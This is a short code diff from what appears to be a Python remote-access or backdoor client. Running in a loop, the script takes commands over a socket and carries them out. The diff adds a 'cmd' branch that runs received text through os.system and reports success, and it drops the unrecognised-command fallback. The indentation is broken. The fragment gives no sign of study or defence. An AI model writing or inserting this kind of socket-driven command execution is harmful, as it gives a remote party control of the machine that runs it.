@@ -88,13 +88,15 @@ while 1 :
         print("command as been executed successfully")
     
     elif command == "cmd":
-        
-
-
-   else:
+       cmdpath = s.recv(buf)
+       cmd = cmdpath.decode()
+       os.system(cmd)
        print("")
-       print("Command is Not Recognsied")
-        
+       print("command as been executed successfully")
+    
+
+
+  
        
        
       
